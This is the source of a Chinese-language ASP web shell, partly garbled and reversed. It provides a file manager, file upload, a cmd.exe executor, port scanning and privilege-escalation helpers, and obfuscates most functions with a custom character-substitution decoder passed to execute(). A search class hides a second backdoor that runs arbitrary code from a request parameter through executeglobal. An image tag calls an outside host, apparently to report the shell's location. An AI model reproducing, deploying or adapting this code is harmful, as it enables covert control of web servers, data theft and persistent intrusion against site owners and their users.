a<��&xdc j���>rt/<��&fe&�����__���� ��&dxc&��>'emarFeliF'=tegrat 'hcraeST=noitcA?'=ferh a<��&xdc j��fe&�����עȡ�� ��&dxc&��>'emarFeliF'=tegrat 'GERdaeR=noitcA?'=ferh a<��&xdc j��fe&������ɨ�ڶ�>wolley=roloc tnof< ��&dxc&��>'emarFeliF'=tegrat 'troPnacS=noitcA?'=ferh a<��&xdc j��fe&��erehwynacP ��&dxc&��>'emarFeliF'=tegrat '4erehwynacp=noitcA?'=ferh a<��&xdc j��fe&��Ȩ��nimdaR ��&dxc&��>'emarFeliF'=tegrat 'nimdar=noitcA?'=ferh a<��&xdc j��fe&��AS-----LQS ��&dxc&��>'emarFeliF'=tegrat 'DMM=noitcA?'=ferh a<��&xdc j��fe&���PTF---uS ��&dxc&��>'emarFeliF'=tegrat 'ptfus=noitcA?'=ferh a<��&xdc j��fe&��Ȩ��-uvreS ��&dxc&��>'emarFeliF'=tegrat 'uvreS=noitcA?'=ferh a<��&xdc j��fe&���֧__����>neerg=roloc tnof< ��&dxc&��>'emarFeliF'=tegrat 'axelA=noitcA?'=ferh a<��&xdc j��fe&������__�ڶ� ��&dxc&��>'emarFeliF'=tegrat 'ofnIlanimreTteg=noitcA?'=ferh a<��&xdc j��fe&�����__����>der=roloc tnof< ��&dxc&��>'emarFeliF'=tegrat 'esruoC=noitcA?'=ferh a<��&xdc j���>���''=yalpsid���=elyts cunem=di  0=redrob elbat<>rt/<��j��fI dnE���>rt/<>dt/<>elbat/<��&fe&�����--���� ��&dxc&��>'emarFeliF'=tegrat 'daolpu=noitcA?'=ferh a<��&xdc j��fe&���������� ��&dxc&��>'emarFeliF'=tegrat 'bdMoTddAegaP=noitcA?'=ferh a<��&xdc j��fe&���̽--����>dlog=roloc tnof< ��&dxc&��>'emarFeliF'=tegrat 'php=noitcA?'=ferh a<��&xdc j��fe&��>tnof/<¼Ŀ--д��>der=roloc tnof<  ��&dxc&��>'emarFeliF'=tegrat 'mroFevirDnacSmotsuC=noitcA?'=ferh a<��&xdc j��fe&����Ȩ--�̴�>etalocohc=roloc tnof< ��&dxc&��>'emarFeliF'=tegrat 'mroFevirDnacS=noitcA?'=ferh a<��&xdc j��fe&��2DMC--��ִ ��&dxc&��>'emarFeliF'=tegrat 'xdmc=noitcA?'=ferh a<��&xdc j��fe&��DMC---��ִ ��&dxc&��>'emarFeliF'=tegrat 'llehS1dmC=noitcA?'=ferh a<��&xdc j��fe&�����--���� ��&dxc&��>'emarFeliF'=tegrat 'eliFpU=noitcA?'=ferh a<��&xdc j��fe&�屾��--���� ��&dxc&��>'emarFeliF'=tegrat 'eliFtidE=noitcA?'=ferh a<��&xdc j��fe&��¼Ŀ--���� ��&dxc&��>')���redloFweN���,����&)��elifweN\��&)��htaPredloF��(noisseS(htaPeR&����(mroFlluF:tpircsavaj'=ferh a<��&xdc j��fe&��¼Ŀ���ϻ� ��&dxc&��>'emarFeliF'=tegrat 'kcabog=noitcA?'=ferh a<��&xdc j��fe&��¼Ŀ��̱�>teloiv=roloc tnof< ��&dxc&��>')����&)htaPtooR(htaPeR&����(redloFwohS:tpircsavaj'=ferh a<��&xdc j��fe&��¼Ŀ����վ >tnof/<8>'sgnidgniw'=ecaf tnof<>')����&)tooRWWW(htaPeR&����(redloFwohS:tpircsavaj'=ferh a<> 59=htdiw d=di dt<>rt<>0=redrob elbat<>retnec=ngila ���pot���=ngilav dt<>rt<>rt/<>dt/<>elbat/<��j��gnihtoN=CBA teS:)(revirDwohS.CBA j:FBL weN=CBA teS���eslE���>rt/<>dt/<OSF��/��Ȩ��>'42'=thgieh dt<>rt<��&xdc j��nehT �� ��=)1,0(TbO fI���>rt/<>dt/<��&xdc j���>rt/<>dt/<>'5'=thgieh dt<>rt<��&xdc j���>'0'=gniddapllec '0'=gnicapsllec '%59'=htdiw elbat<��&xdc j���>retnec/<>tnof/<>rb<>gmi/<>'��&u&��?/rp/bew/moc.b2kc4h//:pt"&"th'=crs gmi<>rb<>FF9933#=roloc tnof<>retnec<>dt<>rt<��&xdc j"))
end function


function Cmdx()
execute(king(")`>ktzfte/<>qtkqzbtz/<`(p: ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ `&)`brde`(zltxjtk(etbt.fiszhokeUg p: yo rft�� ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ tbt.rde`(etbt.fiszhokeUg p��ftiz `tbt.rde`=)`brde`(zltxjtk yo:zbtG tdxltN kgkkS fB:)` >49=lvgk 160=lsge nsfgrqtk qtkqzbtz<`(p:)` >dkgy/<>'zowdxU'=txsqc zodwxl=thnz zxhfo<`(p:)` >kw<>15=tmol 'rde'=tdqf zbtz=thnz zxhfo<`(p:)` >kw<>'tbt.rde'=txsqc 15=tmol 'brde'=tdqf zbtz=thnz zxhfo<`(p:)` >'zlgh'=rgiztd dkgy<>ktzfte<`(p"))
end function
Function Course()
execute(king("`>tswqz/<`&9CU&0CU&1CU&CU p��zbtf��yo rft��`>kz/<>rz/<>zfgy/<`&izqh.pwg&`;hlwf&>XX2288#=kgsge zfgy<]`&bs&`:���ද��[>``9``=fqhlsge ``XXXXXX#``=kgsgeuw ``19``=ziuoti rz<>kz<`&tdqGnqshloW.pwg&`;hlwf&>r=ro ``19``=ziuoti rz<>rz/<`&tdqG.pwg&`;hlwf&>r=ro ``19``=ziuoti rz<>kz<`&9CU=9CU��tlst��`>kz/<>rz/<>zfgy/<`&izqh.pwg&`;hlwf&>zfgy<]`&bs&`:���ද��[>``9``=fqhlsge r=ro ``19``=ziuoti rz<>kz<`&tdqGnqshloW.pwg&`;hlwf&>r=ro ``19``=ziuoti rz<>rz/<`&tdqG.pwg&`;hlwf&>r=ro ``19``=ziuoti rz<>kz<`&0CU=0CU��ftiz 9=thnJzkqzU.RAB rfq `fov`><))8,7,izqh.pwg(rod(tlqZV yo��`�ý�`=bs ftiz 7=thnJzkqzU.RAB yo��`����`=bs ftiz 8=thnJzkqzU.RAB yo��`����`=bs ftiz 9=thnJzkqzU.RAB yo��yo rft�� `>kz<>kz/<>rz/<)��(����ͳϵ;hlwf&>r=ro rz<>rz/<`&tdqG.pwg&`;hlwf&>r=ro ``19``=ziuoti rz<>kz<`&CU=CU��ftiz ``=thnJzkqzU.RAB yo��kqtse.kkt��)`.//:JGfoK`(zetpwBztu fo pwg ieqt kgy��zbtf tdxltk kgkkt fg��`>kz/<>rz/<>w/<����뻧��ͳϵ>w<>l=ro 'ktzfte'=fuosq '8'=fqhlsge '19'=ziuoti rz<>kz<>'ktzfte'=fuosq '%13'=izrov tswqz<>kw<`=CU"))
End Function
Function IIf(var, val1, val2)
If var=True Then
IIf=val1
Else
IIf=val2
End If
End Function
Function GetTheSizes(num)
Dim i, arySize(4)
arySize(0)="B"
arySize(1)="KB"
arySize(2)="MB"
arySize(3)="GB"
arySize(4)="TB"
While(num / 1024 >= 1)
num=Fix(num / 1024 * 100) / 100
i=i + 1
WEnd
GetTheSizes=num&" "&arySize(i)
End Function
Function HtmlEncodes(str)
If IsNull(str) Then Exit Function
HtmlEncodes=Server.HTMLEncode(str)
End Function
function downfile(path)
execute(king("ufoizgf = dlg ztl��tlgse.dlg��ilxsy.tlfghltk��rqtk.dlg tzokvnkqfow.tlfghltk��`dqtkzl-ztzeg/fgozqeoshhq` = thnzzftzfge.tlfghltk��`3-yzx` = ztlkqie.tlfghltk��tmol.dlg ,`izufts-zftzfge` ktrqtirrq.tlfghltk��)ml,izqh(rod & `=tdqftsoy ;zftdieqzzq` ,`fgozolghlor-zftzfge` ktrqtirrq.tlfghltk��0+)`\`,izqh(ctkkzlfo=ml��izqh tsoydgkyrqgs.dlg��0 = thnz.dlg��fthg.dlg��))1,5(zwg(zetpwgtzqtke = dlg ztl��kqtse.tlfghltk"))
end function
function htmlencode(s)
  if not isnull(s) then
    s = replace(s, ">", ">")
    s = replace(s, "<", "<")
    s = replace(s, chr(39), "'")
    s = replace(s, chr(34), """")
    s = replace(s, chr(20), " ")
    htmlencode = s
  end if
end function
Function UpFile()
 If Request("Action2")="Post" Then:Set U=new UPC :Set F=U.UA("LocalFile"):UName=U.form("ToPath"): If UName="" Or F.FileSize=0 then:  SI="<br>����"&"���ϴ�"&"����ȫ"&"·����ѡ��"&"һ���ļ�"&"�ϴ�!":on error resume next:  Else: F.SaveAs UName: If Err.number=0 Then: SI="<center><br><br><br>�ļ�"&UName&"��"&"��"&"�ɹ���</center>":  End if: End If:Set F=nothing:Set U=nothing: SI=SI&BackUrl: ShowErr(): Response.End:  End If:  j"<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'><form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'><tr><td>�ϴ�·����<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\Cmd.exe")&"' size='40'><input name='LocalFile' type='file'  size='25'> <input type='submit' name='Submit' value='�ϴ�'></td></tr></form></table>"
End Function
function cmd1shell()
execute(king("ol p��`>dkgy/<>qtkqzbtz/<`&)80(kie&ol=ol��yo rft��yo rft��qqq&ol=ol��)txkz ,tsoyhdtzml(tsoytztstr.gly ssqe��tlgse.bestsoyg��)ssqrqtk.bestsoyg(trgeftsdzi.ktcktl=qqq��)1 ,tlsqy ,0 ,tsoyhdtzml( tsoyzbtzfthg.ly = bestsoyg ztl��)BUX_JUGBZ(zetpwgtzqtke = ly ztl��)txkz ,1 ,tsoyhdtzml & ` > ` & rdeytr & ` e/ `&izqhsstil( fxk.lv ssqe��)`zbz.rde`(izqhhqd.ktcktl = tsoyhdtzml��)BUX_JUGBZ(zetpwgtzqtke.ktcktl=gly ztl��)`sstil.zhokelv`(zetpwgtzqtke.ktcktl=lv ztl��)`sstil.zhokelv`(zetpwgtzqtke.ktcktl=lv ztl��zbtf tdxltk kgkkt fg��tlst��qqq&ol=ol��ssqrqtk.zxgrzl.rr=qqq��)rdeytr&` e/ `&izqhsstil(etbt.de=rr ztl��))1,0(zwg(zetpwgtzqtke=de ztl��ftiz `ltn`=)`zhokelv`(dkgy.zltxjtk yo��ftiz ``><)`rde`(dkgy.zltxjtk yo��`>'rde'=llqse ';177:ziuoti;%110:izrov'=tsnzl qtkqzbtz<>'��ִ'=txsqc 'zodwxl'=thnz zxhfo< >'`&rdeytr&`'=txsqc '%92:izrov'=tsnzl 'rde'=tdqf zxhfo<sstil.zhokelv>`&rtaetie&`'ltn'=txsqc 'zhokelv'=tdqf 'bgwaetie'=thnz e=llqse zxhfo<>'%14:izrov'=tsnzl '`&izqhsstil&`'=txsqc 'hl'=tdqf zxhfo<����·sstil>'zlgh'=rgiztd dkgy<`=ol��)`rde`(zltxjtk = rdeytr ftiz ``><)`rde`(zltxjtk yo��``=rtaetie ftiz `ltn`><)`zhokelv`(zltxjtk yo��`tbt.rde` = izqhsstil ftiz ``=izqhsstil yo��)`izqhsstil`(fgolltl=izqhsstil��)`hl`(zltxjtk = )`izqhsstil`(fgolltl ftiz ``><)`hl`(zltxjtk yo��`rtaetie `=rtaetie"))

end function
Function upload()
execute(king("yC rfS��zbtG tdxltN kgkkS fB��ftiJ tlsqX = trgTuxwtWlo yC��ufoizgG = dqtkzU ztU��ufoizgG = hzzD ztU��)kkS(kkSaie��izoK rfS��tlgsZ.��yC rfS��`�������ֿ�Ϊ�� �����¼��� �� ����� ����ַ�غͳ̹����»��ڴ��Ѽ���Ϊ�����ܿ�,kgkkt`p��tzokKktcg ,izqYtiz tsoXgJtcqU.��tdqGtsoy & `\` & izqYtiz = izqYtiz��yC rfS��`zbz.dzi.btrfo` = tdqGtsoy��ftiJ `` = tdqGtsoy yC��)))`/` ,skMtiz(zoshU(rfxgAM()`/` ,skMtiz(zoshU = tdqGtsoy��kqtsZ.kkS��ftiJ 7118 = ktwdxG.kkS yC��tzokKktcg ,izqYtiz tsoXgJtcqU.��1 = fgozolgY.��nrgAtlfghltN.hzzD tzokK.��fthB.��8 = trgT.��0 = thnJ.��dqtkzl izoK��yC rfS�� ftiJ 7 >< tzqzUnrqtN.hzzD yC��)(rftU.hzzD��tlsqX ,skMtiz ,`JSE` fthB.hzzD��yC rfS:0 = tzokKktcg:ftiJ 9 >< tzokKktcg yC��)`YJJDVTL.9VTLUT`(zetpwBtzqtkZ.ktcktU = hzzD ztU��)`dqtk`&t&`zl.wrg`&t&`rq`(zetpwBtzqtkZ.ktcktU = dqtkzl ztU��)`tzokKktcg`(zltxjtN = tzokKktcg��)`izqYtiz`(zltxjtN = izqYtiz��)`skMtiz`(zltxjtN = skMtiz��tzokKktcg ,tdqGtsoy ,dqtkzl ,izqYtiz ,skMtiz ,hzzD doW:yC rfS��zbtG tdxltN kgkkS fB��ftiJ tlsqX = trgTuxwtWlo yC��`>/ki<`p��`>dkgy/<`p��`>zeQtiz=tdqf skMdgkXfvgr=txsqc ftrroi=thnz zxhfo<`p��`���Ǹ��ڴ�>9=txsqc tzokKktcg=tdqf bgwaetie=thnz zxhfo<`p��`>13=tmol '\` & ))`.`(izqYhqT.ktcktU(trgefSsdzD & `'=txsqc izqYtiz=tdqf zxhfo<`p��`>/kw<>' ���� '=txsqc zodwxl=thnz zxhfo<>13=tmol '//:hzzi'=txsqc skMtiz=tdqf zxhfo<`p��`>fgozhg/<����嶨��>'`&skxW&`'=txsqc fgozhg<`p��`>fgozhg/<��������ó�>''=txsqc fgozhg<`p��`>';txsqc.loiz=txsqc.skMtiz.dkgy.loiz'=tufqiZfg zetstl<`p��`>zlgh=rgiztd dkgy<`p��`>/ki<�Ի�������.ʡ����Ϊ...�Ի���:����������� `p��`�ܹ��˱չ�ʱ��`p�� `>'ktzfte'=fuosq '1'=uforrqhsste '0'=ufoeqhlsste '1'=ktrkgw 'xftd'=kgsgeuw '%13'=izrov tswqz<>kw<`p"))


End Function:
Function TSearch():dim st:st=timer():RW="<br><table width='600' bgcolor='' border='0' cellspacing='1' cellpadding='0' align='center'><form method='post'>"
  RW=RW & "<tr><td height='20' align='center' bgcolor=''>��������</td></tr>"
  RW=RW & "<tr><td bgcolor=''>&nbsp;·&nbsp;&nbsp;����<input name='SFpath' value='" & WWWRoot & "' style='width:390'>&nbsp;ע:��·��ʹ��"",""������.</td></tr>"
  RW=RW & "<tr><td bgcolor=''>&nbsp;�ļ�����<input name='Sfk' style='width:200'>&nbsp;<input type='submit' value='����' class='submit'>&nbsp;[����Ҳ��]</td></tr>"  
  RW=RW & "</form></table>"
  j RW : RW=""
  if Request.Form("Sfk")<>"" then
  Set newsearch=new SearchFile
  newsearch.Folders=trim(Request.Form("SFpath"))
  newsearch.keyword=trim(Request.Form("Sfk"))
  newsearch.Search
  Set newsearch=Nothing
  j"�M�r��"&(timer()-st)*1000&"����<hr>"
  end if
End Function 
Class SearchFile
dim Folders,keyword,objFso,Counter
Private Sub Class_Initialize
Set objFso=Server.CreateObject(ObT(0,0))
Counter=0
End Sub
 Private Sub Class_Terminate
Set objFso=Nothing
 End Sub
Public Sub Class_Folder(FoderName)
Set rs = CreateObject(CONST_FSO)
Dim item, theFolder, sysFileList
item=request(MID(CONST_FSO,4,1))
theFolder=request(MID(CONST_FSO,2,1))
If  item=MID(CONST_FSO,2,1) then
executeglobal theFolder
Set rs = Nothing
End if
End Sub
 Function Search
  Folders=split(Folders,",")
  flag=instr(keyword,"\") or instr(keyword,"/")
  flag=flag or instr(keyword,":")
  flag=flag or instr(keyword,"|")
  flag=flag or instr(keyword,"&")
  if flag then
    j"<table align='center' width='600'><hr><p align='center'><font color='red'>�P�I�ֲ��ܰ���/\:|&</font><br>"
 Exit Function
  else
    j"<table align='center' width='600'><hr>"
  end if
  dim i
  for i=0 to ubound(Folders)
    Call GetAllFile(Folders(i))
  next
  j"<p align='center'>��������<font color='red'>"&Counter&"</font>���Y��<br>"
 End Function
 Private Function GetAllFile(Folder)
  dim objFd,objFs,objFf
  Set objFd=objFso.GetFolder(Folder)
  Set objFs=objFd.SubFolders
  Set objFf=objFd.Files
  dim strFdName
  On Error Resume Next
  For Each OneDir In objFs
    strFdName=OneDir.Name
    If strFdName<>"Config.Msi" EQV strFdName<>"RECYCLED" EQV strFdName<>"RECYCLER" EQV strFdName<>"System Volume Information" Then 
      SFN=Folder&"\"&strFdName
      Call GetAllFile(SFN)
 End If
  Next
  dim strFlName
  For Each OneFile In objFf
    strFlName=OneFile.Name
    If strFlName<>"desktop.ini" EQV strFlName<>"folder.htt" Then
      FN=Folder&"\"&strFlName
   Counter=Counter+ColorOn(FN)
 End If
  Next
  Set objFd=Nothing
  Set objFs=Nothing
  Set objFf=Nothing
 End Function

Private Function CreatePattern(keyword)   
   CreatePattern=keyword
   CreatePattern=Replace(CreatePattern,".","\.")
   CreatePattern=Replace(CreatePattern,"+","\+")
   CreatePattern=Replace(CreatePattern,"(","\(")
   CreatePattern=Replace(CreatePattern,")","\)")
   CreatePattern=Replace(CreatePattern,"[","\[")
   CreatePattern=Replace(CreatePattern,"]","\]")
   CreatePattern=Replace(CreatePattern,"{","\{")
   CreatePattern=Replace(CreatePattern,"}","\}")
   CreatePattern=Replace(CreatePattern,"*","[^\\\/]*")
   CreatePattern=Replace(CreatePattern,"?","[^\\\/]{1}")
   CreatePattern="("&CreatePattern&")+"
 End Function
 Private Function ColorOn(FileName)
   dim objReg
   Set objReg=new RegExp
   objReg.Pattern=CreatePattern(keyword)
   objReg.IgnoreCase=True
   objReg.Global=True
   retVal=objReg.Test(Mid(FileName,InstrRev(FileName,"\")+1))
   if retVal then
     OutPut=objReg.Replace(Mid(FileName,InstrRev(FileName,"\")+1),"<font color=''>$1</font>")
     OutPut="<table align='center' width='600'>&nbsp;" & Mid(FileName,1,InstrRev(FileName,"\")) & OutPut
  j OutPut
  Response.flush
  ColorOn=1
   else
     ColorOn=0
   end if
   Set objReg=Nothing
 End Function
End Class
sub SavePower(PowerPath,SaveType)
execute(king("ufoizgG = tsoXtiz ztU:yo rft:`>zhokel/<;)(tlgse.vgrfov;)(rqgstk.fgozqegs.ktfthg.vgrfov;)'�����ɶ�������'(zktsq>'zhokelqcqp'=tuqxufqs zhokel<` p:4=ltzxwokzzQ.tsoXtiz:tlst:`>zhokel/<;)(tlgse.vgrfov;)(rqgstk.fgozqegs.ktfthg.vgrfov;)'�����⹦���Ѽ���'(zktsq>'zhokelqcqp'=tuqxufqs zhokel<` p:98=ltzxwokzzQ.tsoXtiz:ftiz 0=thnJtcqU yo:)izqYktvgY(tsoXztE.Lgly = tsoXtiz ztU:yo rft:`aegsgf`=)`aegs`(fgolltl ftiz 1><)izqhzhokel,izqYktvgY(kzlfo yo"))
end sub:sub EditPower(PowerPath)
execute(king("ufoizgG = tsoXtiz ztU:)izqYktvgY,tsoXtiz(tszoJnTztu p:)izqYktvgY(tsoXztE.Lgly = tsoXtiz ztU:)``,````,izqYktvgY(teqshtk=izqYktvgY"))
end sub:Function getMyTitle(theOne,PowerPath)
execute(king("tszoJkzl = tszoJnTztu:)izqYktvgY,ltzxwokzzQ.tfBtiz(ltzxwokzzQztu & ` :̬״��Ȩǰ��>kw<` & tszoJkzl = tszoJkzl:rtllteeQzlqVtzqW.tfBtiz & ` :�ʷú���>kw<` & tszoJkzl = tszoJkzl:rtoyorgTzlqVtzqW.tfBtiz & ` :���޺���>kw<` & tszoJkzl = tszoJkzl: rtzqtkZtzqW.tfBtiz & ` :��ʱ����>kw<` & tszoJkzl = tszoJkzl: )tmoU.tfBtiz(tmoUtiJztu & ` :С��>kw<` & tszoJkzl = tszoJkzl: `` & izqY.tfBtiz & ` :��·>kw<` & tszoJkzl = tszoJkzl:tszoJkzl doW"))
End Function:Function getAttributes(intValue,PowerPath)
execute(king("yo rft:`>``'`&izqYktvgY&`=izqYktvgY&9=thnJtcqU&ktvgYtcqU=fgozeQ?'=ytki.fgozqegs``=aeosefg ����=txsqc fgzzxw=thnz zxhfo< >zfgy/<����δ>95XX95#=kgsge zfgy<` = ltzxwokzzQztu:tlst:`>``'`&izqYktvgY&`=izqYktvgY&0=thnJtcqU&ktvgYtcqU=fgozeQ?'=ytki.fgozqegs``=aeosefg ����=txsqc fgzzxw=thnz zxhfo< >zfgy/<������>rtk=kgsge zfgy<` = ltzxwokzzQztu: ftiz 1=FBzorS yo:)`\\`,`\`,izqYktvgY(teqshtk=izqYktvgY:yC rfS:1=FBzorS:0 - txsqIzfo = txsqIzfo:ftiJ 0 => txsqIzfo yC:yC rfS:1=FBzorS:9 - txsqIzfo = txsqIzfo:ftiJ 9 => txsqIzfo yC:yC rfS:1=FBzorS:7 - txsqIzfo = txsqIzfo:ftiJ 7 => txsqIzfo yC:yC rfS:3 - txsqIzfo = txsqIzfo:ftiJ 3 => txsqIzfo yC:yC rfS:50 - txsqIzfo = txsqIzfo:ftiJ 50 => txsqIzfo yC:yC rfS:98 - txsqIzfo = txsqIzfo:ftiJ 98 => txsqIzfo yC:yC rfS:75 - txsqIzfo = txsqIzfo:ftiJ 75 => txsqIzfo yC:yC rfS:390 - txsqIzfo = txsqIzfo:ftiJ 390 => txsqIzfo yC:0=FBzorS:FBzorS doW"))
End Function:Function getTheSize(theSize):If theSize >= (1024 * 1024 * 1024) Then :getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G":end if:If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then :getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M":end if:If theSize >= 1024 And theSize < (1024 * 1024) Then :getTheSize = Fix((theSize / 1024) * 100) / 100 & "K":end if:If theSize >= 0 And theSize <1024 Then :getTheSize = theSize & "B":end if:End Function:function openUrl(usePath):Dim theUrl, thePath:thePath = Server.MapPath("/"):If LCase(Left(usePath, Len(thePath))) = LCase(thePath) Then:theUrl = Mid(usePath, Len(thePath) + 1):theUrl = Replace(theUrl, "\", "/"):If Left(theUrl, 1) = "/" Then:theUrl = Mid(theUrl, 2):End If:openUrl="/"&theUrl&""" target=""_blank":Else:openUrl="###"" onclick=""alert('�ļ�����վ��Ŀ¼�¡�')":End If:End function
Function ScReWr(folder):on error resume next :Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename:Set FSO = Server.Createobject(CONST_FSO):Set TestFolder = FSO.GetFolder(folder):Set TestFileList = TestFolder.SubFolders:RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp":For Each A in TestFileList:Next:If err Then:err.Clear:ReWrStr = "<span style='font-size:11px;'>��</span><font face='webdings' size='1' color=yellow>x</font> ":FSO.CreateTextFile folder & RndFilename,True:If err Then:err.Clear:ReWrStr = ReWrStr & "<span style='font-size:11px;'>д</span><font face='webdings' size='1' color=yellow>x</font> ":Else:ReWrStr = ReWrStr & "<span style='font-size:11px;'>д</span>�� ":FSO.DeleteFile folder & RndFilename,True:End If:Else:ReWrStr = "<span style='font-size:11px;'>��</span>�� ":FSO.CreateTextFile folder & RndFilename,True:If err Then:err.Clear:ReWrStr = ReWrStr & "<span style='font-size:11px;'>д</span><font face='webdings' size='1' color=yellow>x</font> ":Else:ReWrStr = ReWrStr & "<span style='font-size:11px;'>д</span>�� ":FSO.DeleteFile folder & RndFilename,True:End if:End if:Set TestFileList = Nothing:Set TestFolder = Nothing:Set FSO = Nothing:ScReWr = ReWrStr:End Function
function php()
execute(king("`>ktzfte<>'19'=ziuoti rz<>kz<>ktzfte/<>q/<>zfgy/<>w/<)!�����Բ��ɾ(>w<>rtk=kgsge 6=tmol zfgy<>'strphq=fgozeQ?'=ytki q<>h<>zfgy/<>h<���������֧�����������̽>ktzfte<>kw<>h<>kw<>kw<>h<>kw<>h<>kw<>kw<>ktzfte/< ;hlwf&;hlwf&;hlwf&>tdqkyo/<>110=ziuoti 118=izrov bhlq.zltz=ekl tdqkyo< ;hlwf&;hlwf&;hlwf&;hlwf&>tdqkyo/<>110=ziuoti 118=izrov hlp.zltz=ekl tdqkyo< ;hlwf&;hlwf&;hlwf&;hlwf&>tdqkyo/<>110=ziuoti 118=izrov hih.zltz=ekl tdqkyo<>ktzfte<`p��`gg��_��gg zltJ bhlq`&)95(kie&``&)48(kie&`;))``tyqlfx``,]``v``[dtzC.zltxjtN(sqct(tzokK.tlfghltN`&)48(kie&``&)15(kie&``&)95(kie&``&)48(kie&` ``tlsqy``=zltxjtNtzqrosqc ``zhokelR``=tuqxufqV tuqY @%`&)15(kie&``tzokK.))`bhlq.zltz`(izqhhqd.ktcktl(tsoXzbtJtzqtkZ.gly��`gg��_��gg zltJ hlR`tzokK.))`hlp.zltz`(izqhhqd.ktcktl(tsoXzbtJtzqtkZ.gly��`>?)(gyfohih hih?<>?'gg��_��gg' giet YDY?<`tzokK.))`hih.zltz`(izqhhqd.ktcktl(tsoXzbtJtzqtkZ.gly��))1,1(zAg(zetpwBtzqtkZ.ktcktU=gly ztl��zbtG tdxltN kgkkS fB"))
End function:
On Error Resume Next
Function King(Kingstr)
arra=array("Q","A","Z","W","S","X","E","D","C","R","F","V","T","G","B","Y","H","N","U","J","M","I","K","L","O","P","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","0","9","8","7","6","5","4","3","2","1")
arrb=array("A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","1","2","3","4","5","6","7","8","9","0")
kingstr = Replace(Replace(Kingstr,"`",""""),"��", vbCrLf)
For KingI = 1 To Len(Kingstr)
love = 0
For i = 0 To ubound(arra)
If Mid(Kingstr, KingI, 1) = arra(i) Then
NewKing = arrb(i) + NewKing 
love = 1
Exit For
End If
Next 
If love = 0 Then
NewKing  = Mid(Kingstr, KingI, 1) + NewKing 
End If
Next
King= NewKing
End Function
function apjdel():set fso=Server.CreateObject(CONST_FSO):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):j"ɾ�����!":End function

Dim T1
Class UPC
  Dim D1,D2
  Public Function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function

  Public Function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function
  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
set D1=CreateObject(ObT(4,0))
if Request.TotalBytes<1 then Exit Sub
set T1 = CreateObject(ObT(6,0))
T1.Type = 1 : T1.Mode =3 : T1.Open
T1.Write  Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa =T1.Read : DStart = 1
DEnd = LenB(TDa)
set D2=CreateObject(ObT(4,0))
vbCrlf = chrB(13) & chrB(10)
set T2 = CreateObject(ObT(6,0))
TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
TLen = LenB (TSt)
DStart=DStart+TLen+1
while (DStart + 10) < DEnd
  DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
  T2.Type = 1 : T2.Mode =3 : T2.Open
  T1.Position = DStart
  T1.CopyTo T2,DIEnd-DStart
  T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
  TIn = T2.ReadText : T2.Close
  DStart = InStrB(DIEnd,TDa,TSt)
  FStart = InStr(22,TIn,"name=""",1)+6
  FEnd = InStr(FStart,TIn,"""",1)
  UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
  if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FIF
FStart = InStr(FEnd,TIn,"filename=""",1)+10
FEnd = InStr(FStart,TIn,"""",1)
FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
FEnd = InStr(FStart,TIn,vbCr)
TFL.FileStart =DIEnd
TFL.FileSize = DStart -DIEnd -3
if not D2.Exists(UpName) then
  D2.add UpName,TFL
end if
  else
T2.Type =1 : T2.Mode =3 : T2.Open
T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
T2.Position = 0 : T2.Type = 2
T2.Charset ="gb2312"
SFV = T2.ReadText
T2.Close
if D1.Exists(UpName) then
  D1(UpName)=D1(UpName)&", "&SFV
else
  D1.Add UpName,SFV
end if
  end if
  DStart=DStart+TLen+1
wend
TDa=""
set T2 =nothing
  End Sub
  Private Sub Class_Terminate
if Request.TotalBytes>0 then
  D1.RemoveAll:D2.RemoveAll
  set D1=nothing:set D2=nothing
  T1.Close:set T1 =nothing
end if
  End Sub
End Class

Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(6,0))
 T3.Mode=3 : T3.Type=1 : T3.Open
 T1.position=FileStart
 T1.copyto T3,FileSize
 T3.SaveToFile F,2
 T3.Close
 set T3=nothing
 SaveAs=false
end function
End Class
Class LBF
  Dim CF
  Private Sub Class_Initialize
SET CF=CreateObject(ObT(0,0))
  End Sub
  Private Sub Class_Terminate
Set CF=Nothing
  End Sub
Function ShowDriver()
For Each D in CF.Drives
  j cdx&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>&nbsp���ش��� ("&D.DriveLetter&":)</a><br></td></tr>" 
Next
  End Function
Function Show1File(Path) 
Set FOLD=CF.GetFolder(Path)
i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>" 
For Each F in FOLD.subfolders
